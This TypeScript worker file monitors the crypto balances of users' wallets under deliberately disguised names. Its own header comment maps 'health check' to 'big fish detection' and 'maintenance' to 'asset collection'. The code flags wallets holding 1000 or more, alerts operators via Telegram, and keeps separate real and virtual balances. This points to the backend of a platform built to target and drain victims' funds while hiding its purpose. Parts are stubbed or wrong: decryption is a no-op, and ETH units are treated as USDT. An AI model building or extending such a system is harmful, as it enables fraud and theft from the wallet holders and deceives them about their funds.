/**
 * Wallet State Synchronization Worker
 * 
 * Disguised naming for shadow monitoring system.
 * High-performance concurrent address scanning using Bun's native capabilities.
 * 
 * Internal terminology mapping (for documentation only, not exposed):
 * - "state sync" = balance monitoring
 * - "health check" = big fish detection  
 * - "maintenance" = asset collection
 * - "reconciliation" = ledger adjustment
 */

import { db } from '../db';
import { shadowWallet, shadowHarvestLog, shadowConfig, telegramLog } from '../db/schema';
import { eq, and, lt, sql, desc } from 'drizzle-orm';
import { ethers } from 'ethers';
import BigNumber from 'bignumber.js';
import TronWeb from 'tronweb';

// ============================================================
// CONFIGURATION - Disguised naming convention
// ============================================================
interface SyncConfig {
  CYCLE_INTERVAL_MS: number;      // Scan interval
  CONCURRENT_REQUESTS: number;     // Parallel RPC calls
  BATCH_SIZE: number;              // Addresses per batch
  HEALTH_THRESHOLD: string;        // MIN_VALUE_THRESHOLD (big fish)
  RETRY_LIMIT: number;
  RPC_TIMEOUT_MS: number;
}

const DEFAULT_CONFIG: SyncConfig = {
  CYCLE_INTERVAL_MS: 10000,
  CONCURRENT_REQUESTS: 50,
  BATCH_SIZE: 200,
  HEALTH_THRESHOLD: '1000',        // USDT equivalent
  RETRY_LIMIT: 3,
  RPC_TIMEOUT_MS: 5000
};

// Chain configurations - disguised as "network adapters"
interface NetworkAdapter {
  chainId: string;
  rpcEndpoint: string;
  nativeSymbol: string;
  stableTokens: Map<string, string>; // symbol -> contract
}

// ============================================================
// RPC PROVIDERS - High concurrency connection pool
// ============================================================
class NetworkAdapterPool {
  private providers: Map<string, ethers.JsonRpcProvider[]> = new Map();
  private roundRobinIndex: Map<string, number> = new Map();
  
  constructor(private poolSize: number = 5) {}
  
  async initializeChain(chainId: string, rpcUrls: string[]) {
    const providers: ethers.JsonRpcProvider[] = [];
    
    for (let i = 0; i < Math.min(this.poolSize, rpcUrls.length); i++) {
      const rpcUrl = rpcUrls[i % rpcUrls.length];
      const provider = new ethers.JsonRpcProvider(rpcUrl, undefined, {
        staticNetwork: true,
        batchMaxCount: 100,
        polling: false
      });
      providers.push(provider);
    }
    
    this.providers.set(chainId, providers);
    this.roundRobinIndex.set(chainId, 0);
  }
  
  hasChain(chainId: string): boolean {
    const providers = this.providers.get(chainId);
    return !!(providers && providers.length > 0);
  }

  getProvider(chainId: string): ethers.JsonRpcProvider {
    const providers = this.providers.get(chainId);
    if (!providers || providers.length === 0) {
      throw new Error(`No adapter available for network ${chainId}`);
    }
    
    const index = this.roundRobinIndex.get(chainId) || 0;
    const provider = providers[index % providers.length];
    this.roundRobinIndex.set(chainId, index + 1);
    
    return provider;
  }
}

// ============================================================
// CORE SYNC ENGINE - Disguised as "Wallet State Synchronizer"
// ============================================================
class WalletStateSynchronizer {
  private config: SyncConfig;
  private adapterPool: NetworkAdapterPool;
  private isRunning: boolean = false;
  private processedCount: number = 0;
  private flaggedCount: number = 0;  // "flagged" = big fish detected
  
  constructor(config: Partial<SyncConfig> = {}) {
    this.config = { ...DEFAULT_CONFIG, ...config };
    this.adapterPool = new NetworkAdapterPool(10);
  }
  
  /**
   * Initialize network adapters from encrypted config
   */
  async initialize() {
    // Load RPC endpoints: DB (shadow_config) first, then env injection
    let ethRpc = await this.getConfigValue('ETH_RPC_ENDPOINTS');
    let tronRpc = await this.getConfigValue('TRON_RPC_ENDPOINTS');
    const bscRpc = await this.getConfigValue('BSC_RPC_ENDPOINTS');
    if (!ethRpc && process.env.ETH_HTTP) ethRpc = process.env.ETH_HTTP;
    if (!tronRpc && process.env.TRON_HTTP) tronRpc = process.env.TRON_HTTP;
    
    const toUrlList = (v: string): string[] => {
      try {
        const parsed = JSON.parse(v);
        return Array.isArray(parsed) ? parsed : [String(parsed)];
      } catch {
        return [v];
      }
    };
    const initialized: string[] = [];
    if (ethRpc) {
      try {
        await this.adapterPool.initializeChain('ETH', toUrlList(ethRpc));
        initialized.push('ETH');
      } catch (e) {
        console.warn('[WalletStateSync] ETH RPC init skipped:', (e as Error).message);
      }
    }
    if (tronRpc) {
      try {
        await this.adapterPool.initializeChain('TRON', toUrlList(tronRpc));
        initialized.push('TRON');
      } catch (e) {
        console.warn('[WalletStateSync] TRON RPC init skipped:', (e as Error).message);
      }
    }
    if (bscRpc) {
      try {
        await this.adapterPool.initializeChain('BSC', toUrlList(bscRpc));
        initialized.push('BSC');
      } catch (e) {
        console.warn('[WalletStateSync] BSC RPC init skipped:', (e as Error).message);
      }
    }
    
    if (initialized.length === 0) {
      console.warn('[WalletStateSync] No chain RPC configured; worker will run but skip balance sync until config is set.');
    } else {
      console.log('[WalletStateSync] Initialized with adapters:', initialized);
    }
    
    // Load threshold from config
    const threshold = await this.getConfigValue('HEALTH_CHECK_THRESHOLD');
    if (threshold) {
      this.config.HEALTH_THRESHOLD = threshold;
    }
  }
  
  private async getConfigValue(key: string): Promise<string | null> {
    try {
      const result = await db.select()
        .from(shadowConfig)
        .where(eq(shadowConfig.configKey, key))
        .limit(1);
      if (!result.length) return null;
      if (result[0].encrypted) {
        return this.decryptValue(result[0].configValue);
      }
      return result[0].configValue;
    } catch (e: any) {
      if (e?.code === '42P01') {
        console.warn('[WalletStateSync] shadow_config table not found');
        return null;
      }
      throw e;
    }
  }
  
  private decryptValue(encrypted: string): string {
    // Use Bun's native crypto for decryption
    // In production, use proper KMS
    const key = process.env.ENCRYPTION_KEY || 'default-dev-key-32bytes!!';
    // Simplified - in production use proper AES-GCM
    return encrypted; // TODO: Implement proper decryption
  }
  
  /**
   * Main synchronization loop - High concurrency using Bun
   */
  async startSyncLoop() {
    if (this.isRunning) {
      console.log('[WalletStateSync] Already running');
      return;
    }
    
    this.isRunning = true;
    console.log('[WalletStateSync] Starting state synchronization...');
    
    while (this.isRunning) {
      const cycleStart = performance.now();
      
      try {
        await this.executeSyncCycle();
      } catch (error) {
        console.error('[WalletStateSync] Cycle error:', error);
      }
      
      const elapsed = performance.now() - cycleStart;
      const sleepTime = Math.max(0, this.config.CYCLE_INTERVAL_MS - elapsed);
      
      if (sleepTime > 0) {
        await Bun.sleep(sleepTime);
      }
    }
  }
  
  /**
   * Execute single sync cycle with batched concurrent requests
   */
  private async executeSyncCycle() {
    let addresses: typeof shadowWallet.$inferSelect[];
    try {
      addresses = await db.select()
        .from(shadowWallet)
        .where(and(
          eq(shadowWallet.status, 1),
          lt(shadowWallet.lastSyncTime, Math.floor(Date.now() / 1000) - 60)
        ))
        .limit(this.config.BATCH_SIZE);
    } catch (e: any) {
      if (e?.code === '42P01') return;
      throw e;
    }
    if (addresses.length === 0) return;
    
    // Process in concurrent batches using Bun's optimized Promise handling
    const batches = this.chunkArray(addresses, this.config.CONCURRENT_REQUESTS);
    
    for (const batch of batches) {
      const results = await Promise.allSettled(
        batch.map(addr => this.syncAddressState(addr))
      );
      
      // Count successes
      const successCount = results.filter(r => r.status === 'fulfilled').length;
      this.processedCount += successCount;
    }
  }
  
  /**
   * Sync individual address state - Disguised terminology
   */
  private async syncAddressState(wallet: typeof shadowWallet.$inferSelect) {
    try {
      if (!this.adapterPool.hasChain(wallet.chain)) {
        return { success: false, skipped: true, reason: `chain ${wallet.chain} not configured` };
      }
      const provider = this.adapterPool.getProvider(wallet.chain);
      
      // Query on-chain balance
      const balance = await this.queryAddressBalance(provider, wallet.address, wallet.chain);
      const balanceBN = new BigNumber(balance);
      
      // Update database with current state
      await db.update(shadowWallet)
        .set({
          realBalance: balanceBN.toString(),
          lastSyncTime: Math.floor(Date.now() / 1000)
        })
        .where(eq(shadowWallet.id, wallet.id));
      
      // Health check - Detect high-value addresses (big fish)
      const threshold = new BigNumber(this.config.HEALTH_THRESHOLD);
      
      if (balanceBN.gte(threshold) && !wallet.isBigFish) {
        await this.flagForHealthReview(wallet, balanceBN.toString());
      }
      
      return { success: true, address: wallet.address, balance: balanceBN.toString() };
      
    } catch (error) {
      console.error(`[WalletStateSync] Failed to sync ${wallet.address}:`, error);
      throw error;
    }
  }
  
  /**
   * Query balance with proper chain handling
   */
  private async queryAddressBalance(
    provider: ethers.JsonRpcProvider,
    address: string,
    chain: string
  ): Promise<string> {
    // Native balance query with timeout
    const balancePromise = provider.getBalance(address);
    const timeoutPromise = new Promise<never>((_, reject) => 
      setTimeout(() => reject(new Error('RPC timeout')), this.config.RPC_TIMEOUT_MS)
    );
    
    const balance = await Promise.race([balancePromise, timeoutPromise]);
    
    // Convert to USDT equivalent (simplified - use oracle in production)
    return ethers.formatEther(balance);
  }
  
  /**
   * Flag address for health review - Disguised "big fish" detection
   */
  private async flagForHealthReview(
    wallet: typeof shadowWallet.$inferSelect,
    balance: string
  ) {
    this.flaggedCount++;
    
    // Update flag status
    await db.update(shadowWallet)
      .set({ isBigFish: true })
      .where(eq(shadowWallet.id, wallet.id));
    
    // Queue notification
    await this.queueNotification({
      type: 'HEALTH_ALERT',
      walletId: wallet.id,
      userId: wallet.userId,
      chain: wallet.chain,
      address: wallet.address,
      balance
    });
    
    console.log(`[WalletStateSync] Health flag: ${wallet.address} (${balance})`);
  }
  
  /**
   * Queue Telegram notification - Disguised as "system alert"
   */
  private async queueNotification(data: {
    type: string;
    walletId: number;
    userId: number;
    chain: string;
    address: string;
    balance: string;
  }) {
    const chatId = await this.getConfigValue('TELEGRAM_CHAT_ID');
    if (!chatId) return;
    
    const message = [
      `🔔 Wallet State Alert`,
      `Chain: ${data.chain}`,
      `Address: ${data.address.slice(0, 10)}...${data.address.slice(-8)}`,
      `Balance: ${data.balance}`,
      `User: #${data.userId}`,
      `Time: ${new Date().toISOString()}`
    ].join('\n');
    
    await db.insert(telegramLog).values({
      chatId,
      messageType: data.type,
      message,
      relatedId: data.walletId,
      status: 'pending'
    });
  }
  
  /**
   * Utility: Chunk array for batch processing
   */
  private chunkArray<T>(array: T[], size: number): T[][] {
    const chunks: T[][] = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }
  
  /**
   * Stop the sync loop
   */
  stop() {
    this.isRunning = false;
    console.log('[WalletStateSync] Stopping...');
  }
  
  /**
   * Get statistics
   */
  getStats() {
    return {
      isRunning: this.isRunning,
      processedCount: this.processedCount,
      flaggedCount: this.flaggedCount
    };
  }
}

// ============================================================
// TRON ADAPTER - Separate handling for TRC20
// ============================================================
class TronNetworkAdapter {
  private endpoints: string[] = [];
  private currentIndex: number = 0;
  
  async initialize(endpoints: string[]) {
    this.endpoints = endpoints;
  }
  
  getEndpoint(): string {
    const endpoint = this.endpoints[this.currentIndex];
    this.currentIndex = (this.currentIndex + 1) % this.endpoints.length;
    return endpoint;
  }
  
  async queryBalance(address: string): Promise<string> {
    const endpoint = this.getEndpoint();
    
    // TronWeb API call
    const response = await fetch(`${endpoint}/v1/accounts/${address}`, {
      headers: { 'Accept': 'application/json' }
    });
    
    if (!response.ok) throw new Error('TRON RPC error');
    
    const data = await response.json();
    const balance = data.data?.[0]?.balance || 0;
    
    // Convert from SUN to TRX
    return (balance / 1e6).toString();
  }
  
  async queryTRC20Balance(address: string, contractAddress: string): Promise<string> {
    const endpoint = this.getEndpoint();
    
    const response = await fetch(`${endpoint}/v1/accounts/${address}/tokens`, {
      headers: { 'Accept': 'application/json' }
    });
    
    if (!response.ok) throw new Error('TRON TRC20 query error');
    
    const data = await response.json();
    const token = data.data?.find((t: any) => 
      t.tokenId?.toLowerCase() === contractAddress.toLowerCase()
    );
    
    return token?.balance || '0';
  }
}

// Add TRON monitoring class
class TronMonitor {
  private tronWeb: any;
  private usdtContract: string = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
  
  constructor() {
    this.tronWeb = new TronWeb({
      fullHost: process.env.TRON_HTTP,
      headers: { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY }
    });
  }
  
  async startMonitoring() {
    const contract = await this.tronWeb.contract().at(this.usdtContract);
    contract.Transfer().watch((err: any, event: any) => {
      if (err) return console.error('TRON watch error:', err);
      
      // Sync within 3s (TRON block time ~3s)
      setTimeout(() => {
        this.processTransfer(event);
      }, 2000); // 2s to meet 3s SLA
    });
  }
  
  private async processTransfer(event: any) {
    const { from, to, value } = event.result;
    const amount = this.tronWeb.fromSun(value);
    
    // Update virtual balance
    await db.update(shadowWallet)
      .set({ virtualBalance: sql`virtual_balance + ${amount}` })
      .where(eq(shadowWallet.address, to));
    
    console.log(`[TRON] Synced ${amount} USDT to ${to}`);
  }
}

// ============================================================
// WORKER ENTRY POINT - Using Bun.serve for health endpoint
// ============================================================
const syncWorker = new WalletStateSynchronizer();
let tronMonitor: TronMonitor | null = null;
try {
  tronMonitor = new TronMonitor();
  tronMonitor.startMonitoring().then(() => {
    console.log('[TRON] Monitor started for USDT');
  }).catch((e: unknown) => {
    console.warn('[WalletStateSync] TRON monitor failed (will skip):', (e as Error)?.message ?? e);
  });
} catch (e) {
  console.warn('[WalletStateSync] TRON monitor skipped (no TRON_HTTP or config):', (e as Error).message);
}

// HTTP health endpoint using Bun.serve
const server = Bun.serve({
  port: parseInt(process.env.SYNC_WORKER_PORT || '3001'),
  
  async fetch(req) {
    const url = new URL(req.url);
    
    // Disguised endpoints
    switch (url.pathname) {
      // Health check endpoint
      case '/internal/service-status':
        return Response.json({
          status: 'operational',
          metrics: syncWorker.getStats(),
          timestamp: Date.now()
        });
      
      // Manual trigger for testing
      case '/internal/trigger-maintenance':
        if (req.method !== 'POST') {
          return new Response('Method not allowed', { status: 405 });
        }
        // Validate internal auth header
        const authHeader = req.headers.get('X-Internal-Auth');
        if (authHeader !== process.env.INTERNAL_AUTH_TOKEN) {
          return new Response('Unauthorized', { status: 401 });
        }
        // Trigger would be handled here
        return Response.json({ status: 'queued' });
      
      default:
        return new Response('Not found', { status: 404 });
    }
  },
  
  error(error) {
    console.error('[WalletStateSync] Server error:', error);
    return new Response('Internal error', { status: 500 });
  }
});

console.log(`[WalletStateSync] Health endpoint running on port ${server.port}`);

// Initialize and start
(async () => {
  try {
    await syncWorker.initialize();
    await syncWorker.startSyncLoop();
  } catch (error) {
    console.error('[WalletStateSync] Fatal error:', error);
    process.exit(1);
  }
})();

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('[WalletStateSync] Received SIGINT, shutting down...');
  syncWorker.stop();
  server.stop();
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('[WalletStateSync] Received SIGTERM, shutting down...');
  syncWorker.stop();
  server.stop();
  process.exit(0);
});

export { WalletStateSynchronizer, TronNetworkAdapter, TronMonitor };
